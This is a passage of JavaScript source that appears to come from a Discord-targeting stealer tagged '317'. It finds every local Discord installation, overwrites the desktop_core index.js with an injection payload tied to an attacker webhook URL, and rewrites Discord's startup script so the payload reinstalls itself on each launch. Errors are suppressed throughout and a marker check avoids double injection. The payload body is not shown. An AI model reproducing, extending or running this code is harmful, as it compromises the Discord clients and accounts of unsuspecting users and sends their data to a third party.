            injectCore();
        }
    }
} catch (e) {}

function injectCore() {
    try {
        const payload = ${JSON.stringify(getInjectionPayload(webhookUrl))};
        fs.writeFileSync(coreIndex, payload);
    } catch (e) {}
}

require('${appAsarPath}');
if (fs.existsSync(bdPath)) require(bdPath);
`;
    
    fs.writeFileSync(indexJs, startupScript);
    
    // Also inject directly into desktop_core if possible
    if (coreIndexPath) {
      try {
        const currentContent = fs.readFileSync(coreIndexPath, 'utf8');
        // Only inject if it hasn't been injected already (check for our marker)
        if (!currentContent.includes('317 NUMBER ONE') && !currentContent.includes(webhookUrl)) {
          const payload = getInjectionPayload(webhookUrl);
          fs.writeFileSync(coreIndexPath, payload);
        }
      } catch (e) {}
    }
    
    // Create initiation marker
    const initiationPath = path.join(
      coreIndexPath ? path.dirname(coreIndexPath) : appDir,
      'initiation'
    );
    try {
      if (!fs.existsSync(initiationPath)) {
        fs.mkdirSync(initiationPath, { recursive: true });
      }
    } catch (e) {}
    
    return true;
  } catch (e) {
    return false;
  }
}

/**
 * Main injection function — called from index.js
 */
async function performDiscordInjection(webhookUrl) {
  const results = {
    found: 0,
    injected: 0,
    errors: 0,
    details: []
  };
  
  try {
    // Find Discord installations
    const installs = findDiscordInstalls();
    results.found = installs.length;
    
    if (installs.length === 0) {
      console.log('[317] No Discord installations found for injection');
      return results;
    }
    
    console.log(`[317] Found ${installs.length} Discord installation(s)`);
    
    // Inject into each installation
    for (const install of installs) {
      try {
        const success = injectIntoDiscord(install, webhookUrl);
        if (success) {
          results.injected++;
          results.details.push({ name: install.name, status: 'injected' });
          console.log(`[317] Injected into ${install.name}`);
        } else {
          results.errors++;
          results.details.push({ name: install.name, status: 'failed' });
        }
      } catch (e) {
        results.errors++;
        results.details.push({ name: install.name, status: 'error', message: e.message });
      }
    }
    
  } catch (error) {
    console.error('[317] Discord injection error:', error.message);
  }
  
  return results;
}

module.exports = {
  performDiscordInjection,
  findDiscordInstalls
};
